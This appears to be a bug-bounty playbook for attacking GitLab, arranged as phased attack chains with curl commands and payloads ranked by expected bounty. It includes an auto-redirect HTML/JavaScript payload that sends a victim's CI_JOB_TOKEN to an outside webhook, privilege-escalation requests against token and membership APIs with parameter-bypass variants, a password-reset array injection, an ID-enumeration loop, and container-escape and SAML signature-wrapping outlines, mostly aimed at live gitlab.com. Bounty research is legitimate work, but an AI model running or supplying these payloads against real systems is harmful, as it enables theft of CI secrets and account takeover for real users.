# GitLab Bug Bounty Hunt

**Target Type:** GitLab (SaaS + self-hosted)
**Skills Used:** Entry #097, Entry #105
**Expected Time:** 2-4 hours per attack chain
**Avg Bounty:** $595 Low – $15k Critical | $547k paid in last 90 days

---

## Prerequisites: Set Up Lab

### Step 0.1: Deploy Vulnerable GitLab (Training)

```bash
# Stored XSS in 15.0 ($13,950 bounty)
docker run --detach \
  --hostname gitlab.example.com \
  --publish 8929:80 --publish 8922:22 \
  --name gitlab15.0.0 \
  --shm-size 256m \
  gitlab/gitlab-ee:15.0.0-ee.0

# Get root password
docker exec gitlab15.0.0 grep 'Password:' /etc/gitlab/initial_root_password
```

### Step 0.2: Deploy Latest GitLab (Testing)

```bash
docker run --detach \
  --hostname gitlab.local \
  --publish 9000:80 --publish 9022:22 \
  --name gitlab-latest \
  --shm-size 256m \
  gitlab/gitlab-ee:latest
```

### Step 0.3: Register HackerOne Account

- Create account with `yourhandle@wearehackerone.com` alias
- This is required for testing on GitLab.com

---

## Phase 1: Reconnaissance (30 min)

### Step 1.1: Version Fingerprinting

```bash
# Version disclosure
curl -s https://gitlab.com/api/v4/version

# Check for specific endpoints
curl -s https://gitlab.com/explore/projects
curl -s https://gitlab.com/api/graphql
```

### Step 1.2: User Enumeration

```bash
# GraphQL user enumeration (CVE-2021-4191 style)
curl -s 'https://gitlab.com/api/graphql?query=query{users{edges{node{id username name email}}}}'
```

### Step 1.3: Check for Exposed CI/CD Configuration

```bash
# Check if .gitlab-ci.yml is accessible on public projects
curl -s https://gitlab.com/<namespace>/<project>/-/raw/main/.gitlab-ci.yml
```

---

## Phase 2: CI/CD Pipeline Attacks (HIGHEST ROI)

### Attack 2.1: GraphQL CI/CD Variable Exfiltration

**Reference:** Adarsh Shetty — One-click CI secret steal via GraphQL
**Bounty Potential:** $2k-$5k

**The Attack:**
1. Create HTML that auto-redirects victim to crafted GitLab API URL
2. The `ciConfig` query resolves `include: remote:` directives — and when it fetches the remote URL, it resolves `$VARIABLE` in the URL path
3. Set remote URL to `https://attacker-webhook/$CI_SECRET.yaml`
4. Victim clicks → their CI/CD variables get exfiltrated to your webhook

**Test Payload:**
```html
<!DOCTYPE html>
<html>
<head>
<script>
window.location.href = "https://gitlab.com/api/graphql?query=" + encodeURIComponent(`
query {
  ciConfig(
    projectPath: "victim/project",
    dryRun: true,
    content: "include:\n remote: https://webhook.site/YOUR_ID/$CI_JOB_TOKEN.yaml"
  ) { mergedYaml status errors }
}
`);
</script>
</head>
</html>
```

**Key Insight:** GitLab intentionally disables CSRF protection on GraphQL Queries (GET requests) — this is by design, assuming queries are read-only. The `ciConfig` query violates this assumption by making outbound requests with variable resolution.

### Attack 2.2: CI_JOB_TOKEN Scope Abuse

**Reference:** joaxcar CI_JOB_TOKEN analysis
**Bounty Potential:** $3k-$12k

**The Attack:**
1. Find a project where CI_JOB_TOKEN has broader permissions than intended
2. CI_JOB_TOKEN can still access public/internal project APIs even after GitLab's "fixes"
3. Use CI_JOB_TOKEN to exfiltrate variables from other projects

**Test:**
```bash
# Inside a CI job, test what the token can access
curl -H "Authorization: Bearer $CI_JOB_TOKEN" https://gitlab.com/api/v4/projects
curl -H "Authorization: Bearer $CI_JOB_TOKEN" https://gitlab.com/api/v4/projects/<target-project>/variables
```

### Attack 2.3: Poisoned Pipeline Execution

**Reference:** Pulse Security OMGCICD, H1 #1442118
**Bounty Potential:** $2k-$8k

**The Attack:**
1. Create a personal project (any user can do this)
2. Push a .gitlab-ci.yml that escapes the container
3. If shared runner is DIND/privileged → escape to host → steal other projects' credentials

**Container Escape Payload:**
```yaml
image: python:latest
run:
  script:
    - bash shell.sh
```

Where `shell.sh` mounts cgroups, sets `release_agent`, and executes commands on the host.

**Detection:**
```bash
# Check what runners are available to your project
# Settings → CI/CD → Runners
# If instance-level shared runner with DIND → exploitable
```

---

## Phase 3: Permission Escalation (HIGH VALUE)

### Attack 3.1: Project Access Token API Bypass

**Reference:** CVE-2023-3907 ($shubham_sohi)
**Bounty Potential:** $5k-$15k

**The Attack:**
A Maintainer can craft a POST request with `access_level=50` (Owner) even though UI only shows Maintainer options.

```bash
# Create a project access token with Owner privileges as Maintainer
curl -X POST "https://gitlab.com/api/v4/projects/<project-id>/access_tokens" \
  -H "PRIVATE-TOKEN: <your-token>" \
  -d "name=escalation&access_level=50&scopes[]=api"
```

**If `access_level` is validated → try:**
- Integer overflow: `access_level=9999999`
- Array bypass: `access_level[]=50`
- Null byte: `access_level=50%00`
- Negative: `access_level=-1`

### Attack 3.2: Group Access Token (GAT) Escalation

**Reference:** GitLab Issue #439175
**Bounty Potential:** $5k-$10k

Low-privilege user creates Owner-level Group Access Token.

```bash
# Check if you can create tokens at higher level than your permissions
curl -X POST "https://gitlab.com/api/v4/groups/<group-id>/access_tokens" \
  -H "PRIVATE-TOKEN: <your-token>" \
  -d "name=gat-escalation&access_level=50&scopes[]=api"
```

### Attack 3.3: Custom Role Abuse

**Reference:** Issues #555786, #462665, #451921
**Bounty Potential:** $3k-$8k

Test Guests/Reporters with custom roles like:
- `manage_group_access_tokens` → can they escalate to Owner? (CVE-2024-1299)
- `admin_group_member` → can they modify their own role?
- `manage_group_members` → can they add themselves to higher-privilege groups?

```bash
# Test if Guest with manage_group_members can invite themselves as Owner
curl -X POST "https://gitlab.com/api/v4/groups/<group-id>/members" \
  -H "PRIVATE-TOKEN: <guest-token>" \
  -d "user_id=<your-id>&access_level=50"
```

### Attack 3.4: Member Import Bypass

**Reference:** $theluci (H1)
**Bounty Potential:** $4k-$8k

1. As Maintainer, create a second project
2. Invite your alt account as Owner of the second project
3. Use "Import members from project" feature on the target project
4. The import doesn't validate access_level → alt account becomes Owner of target

```bash
# POST to import members from another project
curl -X POST "https://gitlab.com/api/v4/projects/<target-id>/members/import" \
  -H "PRIVATE-TOKEN: <maintainer-token>" \
  -d "source_project_id=<source-id>"
```

---

## Phase 4: Rails-Specific Exploits

### Attack 4.1: Mass Assignment in Password Reset

**Reference:** CVE-2023-7028 style
**Bounty Potential:** $3k-$10k

```bash
# Test array parameter injection
curl -X POST "https://gitlab.com/users/password" \
  -d "user[email][]=victim@example.com&user[email][]=attacker@example.com"
```

### Attack 4.2: Redis Deserialization

**Reference:** CsEnox/Gitlab-Redis-Deserialization-RCE
**Bounty Potential:** $8k-$15k

If you can control Redis data (via SSRF or other means), GitLab trusts Redis → `Marshal.load` for sessions. Plant malicious session to achieve RCE as git user.

**Prerequisites:** Access to Redis (via SSRF, side-channel, or other vuln)

---

## Phase 5: SAML/SSO Auth Bypass

### Attack 5.1: SAML Signature Wrapping

**Reference:** CVE-2024-45409 (CVSS 10.0)
**Bounty Potential:** $10k-$35k

**The Attack:** Ruby-SAML XPath selector `//ds:DigestValue` picks the FIRST matching node. By smuggling a `DigestValue` inside a `samlp:extensions` element, the signature still validates but assertion is modified.

**Test:**
```bash
# Get a valid SAML response from IdP
# Modify the assertion (change NameID to any user)
# Wrap original DigestValue in extensions element
# Send to GitLab
```

### Attack 5.2: Parser Differential

**Reference:** CVE-2025-25291/25292
**Bounty Potential:** $8k-$15k

Ruby-SAML uses REXML and Nokogiri — they parse the same XML differently. Craft XML that produces different DOM trees under each parser.

---

## Phase 6: API Abuse

### Attack 6.1: IDOR in Group/Project APIs

**Bounty Potential:** $2k-$9k

```bash
# Test IDOR by iterating project IDs
for id in $(seq 1 1000); do
  curl -s "https://gitlab.com/api/v4/projects/$id" | jq '.path_with_namespace'
done

# Test if you can access private group data
curl -s "https://gitlab.com/api/v4/groups/<private-group-id>/members"
```

### Attack 6.2: GraphQL Over-fetching

```bash
# Query for data beyond your permissions
curl -s 'https://gitlab.com/api/graphql?query=query{project(fullPath:"private/project"){id name repository{tree{blobs{nodes{name}}}}}}'
```

### Attack 6.3: Deploy Token Abuse

```bash
# Test deploy token scope restrictions
# If token is read-only, can it write?
git push https://gitlab-ci-token:<deploy-token>@gitlab.com/namespace/project.git
```

---

## Phase 7: Validation & Reporting

### GitLab Report Requirements:
1. ALL reports must include screenshots/videos/logs from YOUR OWN instance
2. AI-generated reports without verifiable PoCs → rejected
3. Use `@wearehackerone.com` email for testing on GitLab.com
4. For self-hosted: use Docker/Omnibus, document version and config
5. Bounty: $1,000 upfront on triage for Critical/High, $500 for Medium

### Report Template:
```markdown
## Summary
[One-line description]

## Product
GitLab.com / Self-Managed

## Version
[Version tested against]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Impact
[What an attacker can achieve]

## CVSS
[CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N]

## Supporting Material
[Video/Screenshot/Logs from YOUR instance]

## Suggested Fix
[Optional: how would you patch this?]
```

---

## Priority Matrix

| Attack | Difficulty | Avg Bounty | Time | Priority |
|--------|-----------|-----------|------|---------|
| GraphQL CI secret steal | Low | $2k-$5k | 1-2hr | **START HERE** |
| Custom role abuse | Low | $3k-$8k | 1-2hr | **START HERE** |
| Project access token bypass | Low | $5k-$15k | 1hr | HIGH |
| IDOR in project APIs | Low | $2k-$9k | 30min | HIGH |
| CI_JOB_TOKEN scope abuse | Medium | $3k-$12k | 2-3hr | HIGH |
| SAML signature wrapping | Medium | $10k-$35k | 3-4hr | MEDIUM |
| Redis deserialization RCE | High | $8k-$15k | 4-6hr | MEDIUM |
| Container escape (DIND) | High | $2k-$8k | 3-4hr | LOW (known issue) |

---

## References
- Entry #097: GitLab Bug Bounty Research Collection (30+ resources)
- Entry #105: GitLab Reproducible Vulnerabilities (Docker lab)
- H1 Report #1442118: Container escape on public CI runners
- H1 Report #493324: Privilege escalation to admin ($10k)
- H1 Report #2058934: CVE-2023-3907 (Maintainer→Owner via token API)
- CVE-2024-45409: SAML auth bypass (CVSS 10.0)
- Adarsh Shetty: GraphQL CI secret steal (albatraoz.hashnode.dev)
- Pulse Security: OMGCICD shared runner attacks (pulsesecurity.co.nz)
